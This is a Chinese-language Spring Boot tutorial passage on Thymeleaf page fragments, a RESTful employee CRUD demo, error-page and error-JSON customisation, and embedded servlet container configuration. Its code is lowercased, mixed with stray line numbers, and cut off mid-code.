  8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   \n\n# 4. 公共页面抽取和高亮处理\n\n抽取公共片段\n<div th:fragment="copy">\n&copy; 2011 the good thymes virtual grocery\n</div>\n2、引入公共片段\n<div th:insert="~{footer :: copy}"></div>\n~{templatename::selector}：模板名::选择器\n~{templatename::fragmentname}:模板名::片段名\n3、默认效果：\ninsert的公共片段在div标签中\n如果使用th:insert等属性进行引入，可以不用写~{}：\n行内写法可以加上：[[~{}]];[(~{})]；\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n三种引入公共片段的th属性：\n\n * th:insert：将公共片段整个插入到声明引入的元素中\n * th:replace：将声明引入的元素替换为公共片段\n * th:include：将被引入的片段的内容包含进这个标签中\n\n<footer th:fragment="copy">\n    &copy; 2011 the good thymes virtual grocery\n</footer>\n引入方式\n<div th:insert="footer :: copy"></div>\n<div th:replace="footer :: copy"></div>\n<div th:include="footer :: copy"></div>\n效果\n<div>\n    <footer>\n        &copy; 2011 the good thymes virtual grocery\n    </footer>\n</div>\n<footer>\n    &copy; 2011 the good thymes virtual grocery\n</footer>\n<div>\n    &copy; 2011 the good thymes virtual grocery\n</div>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n抽取方式：将所有的公共页面放到templates目录下的common中，在寻找片段时也会去遵循模板的映射。\n\n<nav th:fragment="navbar" class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0">\n    <a class="navbar-brand col-sm-3 col-md-2 mr-0" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">[[${session.username}]]</a>\n    <input class="form-control form-control-dark w-100" type="text" placeholder="search" aria-label="search">\n    <ul class="navbar-nav px-3">\n        <li class="nav-item text-nowrap">\n            <a class="nav-link" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">sign out</a>\n        </li>\n    </ul>\n</nav>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n引入方式：\n\n<div th:replace="common/bar :: navbar" ></div>\n\t\x3c!--使用选择器引入：--\x3e\n<div th:replace="common/bar :: #sidebar" ></div>\n\n\n1\n2\n3\n\n\n在我们的页面中，当我们选择员工管理时，侧边栏并没有高亮到员工管理标签，bootstrap中使用active属性来控制标签是否高亮。\n\n我们可以使用参数化的片段签名来动态的指定标签：\n\n在引入片段时传入参数，在页面上判断参数，动态添加active。\n\n<a class="nav-link" th:class="${activeuri == \'emps\' ? \'nav-link active\' : \'nav-link\'}"\n   th:href="@{/emps}">\n    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-users">\n        <path d="m17 21v-2a4 4 0 0 0-4-4h5a4 4 0 0 0-4 4v2"></path>\n        <circle cx="9" cy="7" r="4"></circle>\n        <path d="m23 21v-2a4 4 0 0 0-3-3.87"></path>\n        <path d="m16 3.13a4 4 0 0 1 0 7.75"></path>\n    </svg>\n    员工管理\n</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n在引入的时候指定参数：\n\n<div th:replace="common/bar :: #sidebar(acitveurl=\'main\')" ></div>\n\n\n1\n\n\n# 5.restful请求\n\n实验功能                 请求uri   请求方式\n查询所有员工               emps    get\n查询某个员工(来到修改页面)       emp/1   get\n来到添加页面               emp     get\n添加员工                 emp     post\n来到修改页面（查出员工进行信息回显）   emp/1   get\n修改员工                 emp     put\n删除员工                 emp/1   delete\n\n * 查询全部员工信息\n   \n   @getmapping("/emps")\n   public string emplist(model model){\n       collection<employee> employees = employeedao.getall();\n       model.addattribute("emps",employees);\n       return "emp/list";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n   \n   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n       <h2>员工列表</h2>\n       <a class="btn btn-secondary btn-success">新增</a>\n   \n       <div class="table-responsive">\n           <table class="table table-striped table-sm">\n               <thead>\n                   <tr>\n                       <th>#</th>\n                       <th>姓名</th>\n                       <th>邮箱</th>\n                       <th>性别</th>\n                       <th>生日</th>\n                       <th>部门</th>\n                       <th>操作</th>\n                   </tr>\n               </thead>\n               <tbody>\n                   <tr th:each="emp:${emps}">\n                       <td th:text="${emp.id}"></td>\n                       <td th:text="${emp.lastname}"></td>\n                       <td th:text="${emp.email}"></td>\n                       <td th:text="${emp.gender} == 0? \'女\':\'男\'"></td>\n                       <td th:text="${#dates.format(emp.birth,\'yyyy-mm-dd\')}"></td>\n                       <td th:text="${emp.department.departmentname}"></td>\n                       <td>\n                           <button class="btn btn-sm btn-primary">修改</button>\n                           <button class="btn btn-sm btn-danger">删除</button>\n                       </td>\n                   </tr>\n               </tbody>\n           </table>\n       </div>\n   </main>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   \n\n * 员工添加操作\n   \n   <a class="btn btn-secondary btn-success" th:href="@{/emp}">新增</a>\n   \n   \n   1\n   \n   \n   <!doctype html>\n   \x3c!-- saved from url=(0052)http://getbootstrap.com/docs/4.0/examples/dashboard/ --\x3e\n   <html lang="en" xmlns:th="http://www.thymeleaf.org">\n   \n       <head>\n           <meta http-equiv="content-type" content="text/html; charset=utf-8">\n           <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n           <meta name="description" content="">\n           <meta name="author" content="">\n   \n           <title>dashboard template for bootstrap</title>\n           \x3c!-- bootstrap core css --\x3e\n           <link href="asserts/css/bootstrap.min.css" th:href="@{/webjars/bootstrap/4.0.0/css/bootstrap.css}" rel="stylesheet">\n   \n           \x3c!-- custom styles for this template --\x3e\n           <link href="asserts/css/dashboard.css" th:href="@{/asserts/css/dashboard.css}" rel="stylesheet">\n           <style type="text/css">\n               /* chart.js */\n   \n               @-webkit-keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               @keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               .chartjs-render-monitor {\n                   -webkit-animation: chartjs-render-animation 0.001s;\n                   animation: chartjs-render-animation 0.001s;\n               }\n           </style>\n       </head>\n   \n       <body>\n           \x3c!--引入抽取的topbar--\x3e\n           \x3c!--模板名：会使用thymeleaf的前后缀配置规则进行解析--\x3e\n           <div th:replace="common/bar::navbar"></div>\n   \n           <div class="container-fluid">\n               <div class="row">\n                   \x3c!--引入侧边栏--\x3e\n                   <div th:replace="common/bar::#sidebar(activeuri=\'emps\')"></div>\n   \n                   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n                       \x3c!--需要区分是员工修改还是添加；--\x3e\n                       <form th:action="@{/emp}" method="post">\n                           \x3c!--发送put请求修改员工数据--\x3e\n                           \x3c!--\n   1、springmvc中配置hiddenhttpmethodfilter;（springboot自动配置好的）\n   2、页面创建一个post表单\n   3、创建一个input项，name="_method";值就是我们指定的请求方式\n   --\x3e\n                           <input type="hidden" name="_method" value="put" th:if="${emp!=null}"/>\n                           <input type="hidden" name="id" th:if="${emp!=null}" th:value="${emp.id}">\n                           <div class="form-group">\n                               <label>lastname</label>\n                               <input name="lastname" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${emp.lastname}">\n                           </div>\n                           <div class="form-group">\n                               <label>email</label>\n                               <input name="email" type="email" class="form-control" placeholder="zhangsan@atguigu.com" th:value="${emp!=null}?${emp.email}">\n                           </div>\n                           <div class="form-group">\n                               <label>gender</label><br/>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="1" th:checked="${emp!=null}?${emp.gender==1}">\n                                   <label class="form-check-label">男</label>\n                               </div>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="0" th:checked="${emp!=null}?${emp.gender==0}">\n                                   <label class="form-check-label">女</label>\n                               </div>\n                           </div>\n                           <div class="form-group">\n                               <label>department</label>\n                               \x3c!--提交的是部门的id--\x3e\n                               <select class="form-control" name="department.id">\n                                   <option th:selected="${emp!=null}?${dept.id == emp.department.id}" th:value="${dept.id}" th:each="dept:${depts}" th:text="${dept.departmentname}">1</option>\n                               </select>\n                           </div>\n                           <div class="form-group">\n                               <label>birth</label>\n                               <input name="birth" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${#dates.format(emp.birth, \'yyyy-mm-dd hh:mm\')}">\n                           </div>\n                           <button type="submit" class="btn btn-primary" th:text="${emp!=null}?\'修改\':\'添加\'">添加</button>\n                       </form>\n                   </main>\n               </div>\n           </div>\n   \n           \x3c!-- bootstrap core javascript\n   ================================================== --\x3e\n           \x3c!-- placed at the end of the document so the pages load faster --\x3e\n           <script type="text/javascript" src="asserts/js/jquery-3.2.1.slim.min.js" th:src="@{/webjars/jquery/3.3.1/jquery.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/popper.min.js" th:src="@{/webjars/popper.js/1.11.1/dist/popper.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/bootstrap.min.js" th:src="@{/webjars/bootstrap/4.0.0/js/bootstrap.js}"><\/script>\n   \n           \x3c!-- icons --\x3e\n           <script type="text/javascript" src="asserts/js/feather.min.js" th:src="@{/asserts/js/feather.min.js}"><\/script>\n           <script>\n               feather.replace()\n           <\/script>\n   \n       </body>\n   \n   </html>\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   81\n   82\n   83\n   84\n   85\n   86\n   87\n   88\n   89\n   90\n   91\n   92\n   93\n   94\n   95\n   96\n   97\n   98\n   99\n   100\n   101\n   102\n   103\n   104\n   105\n   106\n   107\n   108\n   109\n   110\n   111\n   112\n   113\n   114\n   115\n   116\n   117\n   118\n   \n   \n   @getmapping("/emp")\n   public string emppage(model model){\n       collection<department> departments = departmentdao.getdepartments();\n       model.addattribute("depts",departments);\n       return "emp/add";\n   }\n   \n   @postmapping("/emp")\n   public string save(employee employee){\n       employeedao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   \n   \n   提交时如果出现400错误说明类型转化出现了问题，默认按照yyyy/mm/dd进行格式化。\n   \n   \n\n@bean\n@conditionalonproperty(prefix = "spring.mvc", name = "date-format")\npublic formatter<date> dateformatter() {\n    return new dateformatter(this.mvcproperties.getdateformat());\n}\n\npublic string getdateformat() {\n    return this.dateformat;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n需要在配置文件中配置格式化日期的格式：spring.mvc.date-format: yyyy-mm-dd\n\n * 员工修改页面\n   \n   <a class="btn btn-sm btn-primary" th:href="@{/emp/}+${emp.id}">修改</a>\n   \n   \n   \n   1\n   2\n   \n   \n   因为员工修改页面和员工添加页面组成类似，因此可以复用一个页面。\n   \n   /**\n        * 来到update页面\n        * @param id\n        * @return\n        */\n   @getmapping("/emp/{id}")\n   public string update(@pathvariable("id")integer id,model model){\n       collection<department> departments = departmentdao.getdepartments();\n       model.addattribute("depts",departments);\n       employee employee = employeedao.get(id);\n       model.addattribute("emp",employee);\n       return "emp/add";\n   }\n   \n   @putmapping("/emp")\n   public string update(employee employee){\n       employeedao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   \n   \n   注意： 提交put请求时，需要配置httphiddenmethodfilter，并且隐藏input框name为"_method"，value为提交方法。\n\n * 删除员工信息\n   \n   页面添加删除表单。下面的这种添加方式会影响页面的布局\n   \n   <form th:action="@{/emp}+${emp.id}" method="post">\n       <input type="hidden" name="_method" value="delete">\n       <button class="btn btn-sm btn-danger" type="submit">删除</button>\n   </form>\n   \n   \n   1\n   2\n   3\n   4\n   \n\n最好是改成下面的方式：\n\n<button th:attr="del_uri=@{/emp/}+${emp.id}" class="btn btn-sm btn-danger deletebtn">删除</button>\n\n\n<form id="deleteempform"  method="post">\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n<script>\n\t$(".deletebtn").click(function(){\n\t\t//删除当前员工的\n\t\t$("#deleteempform").attr("action",$(this).attr("del_uri")).submit();\n\t\treturn false;\n\t});\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# spring 错误处理机制\n\n# 错误机制原理\n\nspringboot在出错时（客户端、服务器）都会返回一个默认的页面或者默认的json数据。主要是由mvcerrorautoconfiguration进行自动配置的。我们需要定制返回的数据和页面。\n\nmvcerrorautoconfiguration给容器中添加了以下的组件：\n\n * defaulterrorattributes\n   \n   // 帮我们在页面获取信息\n       @override\n   public map<string, object> geterrorattributes(requestattributes requestattributes,\n                                                 boolean includestacktrace) {\n       map<string, object> errorattributes = new linkedhashmap<string, object>();\n       errorattributes.put("timestamp", new date());\n       addstatus(errorattributes, requestattributes);\n       adderrordetails(errorattributes, requestattributes, includestacktrace);\n       addpath(errorattributes, requestattributes);\n       return errorattributes;\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n * basicerrorcontroller\n   \n   @controller\n   @requestmapping("${server.error.path:${error.path:/error}}")\n   public class basicerrorcontroller extends abstracterrorcontroller {\n       @requestmapping(produces = "text/html")//产生html类型的数据；浏览器发送的请求来到这个方法处理\n       public modelandview errorhtml(httpservletrequest request,\n                                     httpservletresponse response) {\n           httpstatus status = getstatus(request);\n           map<string, object> model = collections.unmodifiablemap(geterrorattributes(\n               request, isincludestacktrace(request, mediatype.text_html)));\n           response.setstatus(status.value());\n           //去哪个页面作为错误页面；包含页面地址和页面内容\n           modelandview modelandview = resolveerrorview(request, response, status, model);\n           return (modelandview == null ? new modelandview("error", model) : modelandview);\n       }\n       @requestmapping\n       @responsebody //产生json数据，其他客户端来到这个方法处理；\n       public responseentity<map<string, object>> error(httpservletrequest request) {\n           map<string, object> body = geterrorattributes(request,\n                                                         isincludestacktrace(request, mediatype.all));\n           httpstatus status = getstatus(request);\n           return new responseentity<map<string, object>>(body, status);\n       }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   \n\n * errorpagecustomizer\n   \n   @value("${error.path:/error}")\n   private string path = "/error"; 系统出现错误以后来到error请求进行处理；（web.xml注册的错误页\n       面规则）\n   \n   \n   1\n   2\n   3\n   \n\n * defaulterrorviewresolver\n   \n   @override\n   public modelandview resolveerrorview(httpservletrequest request, httpstatus status,\n                                        map<string, object> model) {\n       modelandview modelandview = resolve(string.valueof(status), model);\n       if (modelandview == null && series_views.containskey(status.series())) {\n           modelandview = resolve(series_views.get(status.series()), model);\n       }\n       return modelandview;\n   }\n   private modelandview resolve(string viewname, map<string, object> model) {\n       //默认springboot可以去找到一个页面？ error/404\n       string errorviewname = "error/" + viewname;\n       //模板引擎可以解析这个页面地址就用模板引擎解析\n       templateavailabilityprovider provider = this.templateavailabilityproviders\n           .getprovider(errorviewname, this.applicationcontext);\n       if (provider != null) {\n           //模板引擎可用的情况下返回到errorviewname指定的视图地址\n           return new modelandview(errorviewname, model);\n       }\n       //模板引擎不可用，就在静态资源文件夹下找errorviewname对应的页面 error/404.html\n       return resolveresource(errorviewname, model);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   \n\n一但系统出现4xx或者5xx之类的错误，errorpagecustomizer就会生效（定制错误的响应规则），就会来到/error请求；就会被basicerrorcontroller处理。\n\n关于响应页面，去哪个页面是由defaulterrorviewresolver解析得到的。\n\nprotected modelandview resolveerrorview(httpservletrequest request,\n                                        httpservletresponse response, httpstatus status, map<string, object> model) {\n    //所有的errorviewresolver得到modelandview\n    for (errorviewresolver resolver : this.errorviewresolvers) {\n        modelandview modelandview = resolver.resolveerrorview(request, status, model);\n        if (modelandview != null) {\n            return modelandview;\n        }\n    }\n    return null;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 定制错误页面\n\n有模板引擎的情况下，将错误页面命名为错误状态码.html，放在模板引擎文件夹里面的error文件夹下。我们可以使用4xx和5xx作为错误页面的文件名来匹配这种类型的所有错误，精确优先（优先寻找精确的状态码.html）。\n\n没有模板引擎（模板引擎找不到这个错误页面），静态资源文件夹下找，静态资源文件夹下的不会被模板引擎解析 。以上都没有错误页面，就是默认来到springboot默认的错误提示页面。\n\n我们能在页面获取的信息是：\n\n * timestamp：时间戳\n * status：状态码\n * error：错误提示\n * exception：异常对象\n * message：异常消息\n * errors：jsr303数据校验的错误\n\n# 定制错误的json数据\n\n 1. 自定义异常处理器\n    \n    package com.pwddd.springboot.exception;\n    \n    import org.springframework.web.bind.annotation.controlleradvice;\n    import org.springframework.web.bind.annotation.exceptionhandler;\n    import org.springframework.web.bind.annotation.responsebody;\n    \n    import java.util.hashmap;\n    import java.util.map;\n    \n    @controlleradvice\n    public class myexceptionhandler {\n    \n        @responsebody\n        @exceptionhandler(usernotexistexception.class)\n        public map<string,object> handleexception(exception e){\n            hashmap<string, object> map = new hashmap<>();\n            map.put("code",404);\n            map.put("msg","用户不存在");\n            return map;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 2. 以上的代码虽然可以返回json数据，但是，浏览器访问也返回json数据。我们需要转发到error上，完成自适应处理器\n    \n    @exceptionhandler(usernotexistexception.class)\n    public string handleexception(exception e){\n        hashmap<string, object> map = new hashmap<>();\n        map.put("code",404);\n        map.put("msg","用户不存在");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. 转到error之后，因为我们的错误状态码问题，导致没有对应的错误页面，因此显示还是默认的空白页。我们需要传入默认的状态码\n    \n    @exceptionhandler(usernotexistexception.class)\n    public string handleexception(exception e, httpservletrequest request){\n        hashmap<string, object> map = new hashmap<>();\n        request.setattribute("javax.servlet.error.status_code",400);\n        map.put("code",404);\n        map.put("msg","用户不存在");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 4. 我们定制的数据这样携带不出去，我们需要将定制的数据携带出去。相应的数据是由geterrorattributes获取的。我们想要定制的话，我们可以完全编写一个实现类，完全替代。但是这样太麻烦了，我们可以继承并重写相应的方法。页面上能用的数据，或者是json返回能用的数据都是通过errorattributes.geterrorattributes得到。容器中defaulterrorattributes.geterrorattributes()默认进行数据处理的\n    \n    //给容器中加入我们自己定义的errorattributes\n    @component\n    public class myerrorattributes extends defaulterrorattributes {\n        @override\n        public map<string, object> geterrorattributes(requestattributes requestattributes,\n                                                      boolean includestacktrace) {\n            map<string, object> map = super.geterrorattributes(requestattributes,\n                                                               includestacktrace);\n            //requestattributes.getattributes("ext",0);   // 获取异常处理器的数据。\n            map.put("company","atguigu");\n            return map;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    \n    \n    最终的效果：响应是自适应的，可以通过定制errorattributes改变需要返回的内容。\n\n\n# 嵌入式web容器\n\nspringboot默认使用tomcat作为嵌入式的servlet容器。我们需要考虑，定制配置、切换其他的容器。\n\n\n\n# 定制tomcat配置\n\n 1. 修改和server有关的配置（serverproperties【也是embeddedservletcontainercustomizer】）。\n\nerver.port=8081\nserver.context‐path=/crud\nserver.tomcat.uri‐encoding=utf‐8\n//通用的servlet容器设置\nserver.xxx\n//tomcat的设置\nserver.tomcat.xxx\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. 编写一个embeddedservletcontainercustomizer：嵌入式的servlet容器的定制器，来修改servlet容器的配置\n\n@bean //一定要将这个定制器加入到容器中\npublic embeddedservletcontainercustomizer embeddedservletcontainercustomizer(){\n    return new embeddedservletcontainercustomizer() {\n        //定制嵌入式的servlet容器相关的规则\n        @override\n        public void customize(configurableembeddedservletcontainer container) {\n            container.setport(8083);\n        }\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 注册servlet三大组件【servlet、filter、listener】\n\nservlet:\n\n//注册三大组件\n@bean\npublic servletregistrationbean myservlet(){\n    servletregistrationbean registrationbean = new servletregistrationbean(new\n                                                                           myservlet(),"/myservlet");\n    return registrationbean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nfilter:\n\n@bean\npublic filterregistrationbean myfilter(){\n    filterregistrationbean registrationbean = new filterregistrationbean();\n    registrationbean.setfilter(new myfilter());\n    registrationbean.seturlpatterns(arrays.aslist("/hello","/myservlet"));\n    return registrationbean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlistener:\n\n@bean\npublic servletlistenerregistrationbean mylistener(){\n    servletlistenerregistrationbean<mylistener> registrationbean = new\n        servletlistenerregistrationbean<>(new mylistener());\n    return registrationbean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nspringboot帮我们自动springmvc的时候，自动的注册springmvc的前端控制器。dispatcherservlet。\n\ndispatcherservletautoconfiguration：\n\n@bean(name = default_dispatcher_servlet_registration_bean_name)\n@conditionalonbean(value = dispatcherservlet.class, name =\n                   default_dispatcher_servlet_bean_name)\npublic servletregistrationbean dispatcherservletregistration(\n    dispatcherservlet dispatcherservlet) {\n    servletregistrationbean registration = new servletregistrationbean(\n        dispatcherservlet, this.serverproperties.getservletmapping());\n    //默认拦截： / 所有请求；包静态资源，但是不拦截jsp请求； /*会拦截jsp\n    //可以通过server.servletpath来修改springmvc前端控制器默认拦截的请求路径\n    registration.setname(default_dispatcher_servlet_bean_name);\n    registration.setloadonstartup(\n        this.webmvcproperties.getservlet().getloadonstartup());\n    if (this.multipartconfig != null) {\n        registration.setmultipartconfig(this.multipartconfig);\n    }\n    return registration;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 替换其他容器\n\ntomcat默认支持：\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter‐web</artifactid>\n    引入web模块默认就是使用嵌入式的tomcat作为servlet容器；\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\njetty:\n\n<!‐‐ 引入web模块 ‐‐>\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter‐web</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>spring‐boot‐starter‐tomcat</artifactid>\n            <groupid>org.springframework.boot</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!‐‐引入其他的servlet容器‐‐>\n<dependency>\n    <artifactid>spring‐boot‐starter‐jetty</artifactid>\n    <groupid>org.springframework.boot</groupid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nundertow：\n\n<!‐‐ 引入web模块 ‐‐>\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter‐web</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>spring‐boot‐starter‐tomcat</artifactid>\n            <groupid>org.springframework.boot</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!‐‐引入其他的servlet容器‐‐>\n<dependency>\n    <artifactid>spring‐boot‐starter‐undertow</artifactid>\n    <groupid>org.springframework.boot</groupid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 自动配置原理\n\nembeddedservletcontainerautoconfiguration：嵌入式的servlet容器自动配置\n\n@autoconfigureorder(ordered.highest_precedence)\n@configuration\n@conditionalonwebapplication\n@import(beanpostprocessorsregistrar.class)\n//导入beanpostprocessorsregistrar：spring注解版；给容器中导入一些组件\n//导入了embeddedservletcontainercustomizerbeanpostprocessor：\n//后置处理器：bean初始化前后（创建完对象，还没赋值赋值）执行初始化工作\npublic class embeddedservletcontainerautoconfiguration {\n    @configuration\n    @conditionalonclass({ servlet.class, tomcat.class })//判断当前是否引入了tomcat依赖；\n    @conditionalonmissingbean(value = embeddedservletcontainerfactory.class, search =\n                              searchstrategy.current)//判断当前容器没有用户自己定义embeddedservletcontainerfactory：嵌入式的\n    servlet容器工厂；作用：创建嵌入式的servlet容器\n        public static class embeddedtomcat {\n            @bean\n            public tomcatembeddedservletcontainerfactory tomcatembeddedservletcontainerfactory()\n            {\n                return new tomcatembeddedservletcontainerfactory();\n            }\n        }\n    /**\n* nested configuration if jetty is being used.\n*/\n    @configuration\n    @conditionalonclass({ servlet.class, server.class, loader.class,\n                         webappcontext.class })\n    @conditionalonmissingbean(value = embeddedservletcontainerfactory.class, search =\n                              searchstrategy.current)\n    public static class embeddedjetty {\n        @bean\n        public jettyembeddedservletcontainerfactory jettyembeddedservletcontainerfactory() {\n            return new jettyembeddedservletcontainerfactory();\n        }\n    }\n    /**\n* nested configuration if undertow is being used.\n*/\n    @configuration\n    @conditionalonclass({ servlet.class, undertow.class, sslclientauthmode.class })\n    @conditionalonmissingbean(value = embeddedservletcontainerfactory.class, search =\n                              searchstrategy.current)\n    public static class embeddedundertow {\n        @bean\n        public undertowembeddedservletcontainerfactory\n            undertowembeddedservletcontainerfactory() {\n            return new undertowembeddedservletcontainerfactory();\n        }\n    }\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\nembeddedservletcontainerfactory嵌入式servlet容器工厂\n\npublic interface embeddedservletcontainerfactory {\n    //获取嵌入式的servlet容器\n    embeddedservletcontainer getembeddedservletcontainer(\n        servletcontextinitializer... initializers);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n嵌入式的容器工厂：\n\n\n\n嵌入式的容器：\n\n\n\n@override\npublic embeddedservletcontainer getembeddedservletcontainer(\n    servletcontextinitializer... initializers) {\n    //创建一个tomcat\n    tomcat tomcat = new tomcat();\n    //配置tomcat的基本环节\n    file basedir = (this.basedirectory != null ? this.basedirectory\n                    : createtempdir("tomcat"));\n    tomcat.setbasedir(basedir.getabsolutepath());\n    connector connector = new connector(this.protocol);\n    tomcat.getservice().addconnector(connector);\n    customizeconnector(connector);\n    tomcat.setconnector(connector);\n    tomcat.gethost().setautodeploy(false);\n    configureengine(tomcat.getengine());\n    for (connector additionalconnector : this.additionaltomcatconnectors) {\n        tomcat.getservice().addconnector(additionalconnector);\n    }\n    preparecontext(tomcat.gethost(), initializers);\n    //将配置好的tomcat传入进去，返回一个embeddedservletcontainer；并且启动tomcat服务器\n    return gettomcatembeddedservletcontainer(tomcat);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nembeddedservletcontainercustomizer定制器帮我们修改了servlet容器的配置。\n\n容器中导入了embeddedservletcontainercustomizerbeanpostprocessor。\n\n//初始化之前\n@override\npublic object postprocessbeforeinitialization(object bean, string beanname)\n    throws beansexception {\n    //如果当前初始化的是一个configurableembeddedservletcontainer类型的组件\n    if (bean instanceof configurableembeddedservletcontainer) {\n        //\n        postprocessbeforeinitialization((configurableembeddedservletcontainer) bean);\n    }\n    return bean;\n}\nprivate void postprocessbeforeinitialization(\n    configurableembeddedservletcontainer bean) {\n    //获取所有的定制器，调用每一个定制器的customize方法来给servlet容器进行属性赋值；\n    for (embeddedservletcontainercustomizer customizer : getcustomizers()) {\n        customizer.customize(bean);\n    }\n}\nprivate collection<embeddedservletcontainercustomizer> getcustomizers() {\n    if (this.customizers == null) {\n        // look up does not include the parent context\n        this.customizers = new 